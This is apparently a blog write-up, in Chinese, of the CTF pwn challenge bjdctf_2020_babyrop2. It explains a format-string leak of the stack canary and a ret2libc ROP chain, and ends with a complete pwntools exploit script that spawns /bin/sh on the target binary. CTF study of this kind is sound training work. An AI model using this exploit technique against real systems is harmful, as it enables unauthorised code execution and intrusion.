    bjdctf_2020_babyrop2

    PWN题 ROP canary
    Created At : 2020-07-03 12:47
    Count:587 Views 👀 :
    Comment:

    保护机制（64位）：

    Arch: amd64-64-little
    RELRO: Partial RELRO
    Stack: Canary found
    NX: NX enabled
    PIE: No PIE (0x400000)

    可见比babyrop1那题多一个canary的保护机制。

    利用思路：

    通过格式化漏洞泄露canary，然后溢出通过puts函数的rop链泄露libc地址，再次溢出rop执行getshell

    本题的第一个输入只允许输入6个字节，__isoc99_scanf(“%6s”, &format); 所以输出也是6个字节。
    所以我们就就一个一个偏移试过去，aa%1$p 、aa%2$p ……

    当输入 aa%6$p 时，得到 aa0x702436256161 ，可见我们输入的内容在偏移6上，所以格式化字符串的偏移是6

    而canary的值是var_8变量，处在 rbp-0x8 的位置，我们要计算偏移。我们输入的format变量位于 ebp-0x10 的位置，所以偏移就是 0x8

    所以我们尝试直接在第一个输入处输入 %7$p ，输出来的16字节数据一定是canary的值没错了。

    接收canary的值 ：

    p.recvuntil('0x')
canary=int(p.recv(16),16)

    一般canary的位置都在 ebp-8 的位置。所以我们后续溢出的时候把canary的值填回去就能绕过检查了，

    具体操作：

    payload=’a’*0x18+p64(canary)+p64(0xdeadbeef)+ …….

    然后后续操作就跟 babyrop1 一样了。

    对了，本题踩的坑： 在泄露puts地址时，要加上 p.recv() 表示全部接收完。要不然puts地址数据会丢失 （调试得puts的地址为 0xa ，显然不对啊），导致后续操作都出错了。要不是我把puts地址给打印出来看看，我还不知道错在哪里呢 QAQ

    完整exp：

    #coding:utf-8
from pwn import *
p=process('./bjdctf_2020_babyrop2')
# p=remote('node3.buuoj.cn',28226)
elf=ELF('./bjdctf_2020_babyrop2')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil('give u some gift to help u!')
p.sendline('%7$p')
p.recvuntil('0x')
canary=int(p.recv(16),16)
print "canary is "+hex(canary)

pop_rdi=0x400993
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
vuln_addr=0x0400887

payload1='a'*0x18+p64(canary)+p64(0xdeadbeef)+p64(pop_rdi)+p64(puts_got)
payload1+=p64(puts_plt)+p64(vuln_addr)
p.recvuntil('me u story!')
p.sendline(payload1)
p.recv() 
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
print "puts_addr is "+hex(puts_addr)

libc_base= puts_addr - libc.symbols['puts']
system_addr=libc_base + libc.symbols['system']
binsh_addr= libc_base+ libc.search("/bin/sh\x00").next()

payload2='a'*0x18 +p64(canary)+'b'*8+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
p.sendline(payload2)
p.interactive()
